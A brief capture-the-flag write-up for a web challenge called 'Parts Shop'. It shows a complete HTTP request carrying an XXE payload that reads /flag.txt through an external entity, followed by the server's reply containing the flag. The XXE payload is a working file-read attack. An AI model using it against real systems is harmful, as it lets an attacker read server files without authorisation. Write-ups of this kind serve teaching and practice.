
# Parts Shop [Web]

### 150

We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in `/flag.txt`)

[https://uscybercombine-s4-parts-shop.chals.io/](https://uscybercombine-s4-parts-shop.chals.io/)

## Solve

- XXE , 

```
POST /blueprint HTTP/1.1
Host: uscybercombine-s4-parts-shop.chals.io
Cookie: session=eyJ1dWlkIjoiMTRkZDRjNGYtNmUxMy00MmVjLWE1MGEtMjMyYWVmOTFlN2Y3In0.ZlpVvg.XVLSYBost8Q4uuTU6WGmnKzoERo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-s4-parts-shop.chals.io/blueprint
Content-Type: text/plain;charset=UTF-8
Content-Length: 256
Origin: https://uscybercombine-s4-parts-shop.chals.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=1
Te: trailers
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<part>
  <name>Malecon</name>
  <author>&xxe;</author>
  <image>robo.jpg</image>
  <description>es el mas chido</description>
</part>

```

```
## Robo HAck

Created by: SIVBGR{fu11y_upgr4d3d}

es el mas chido
```
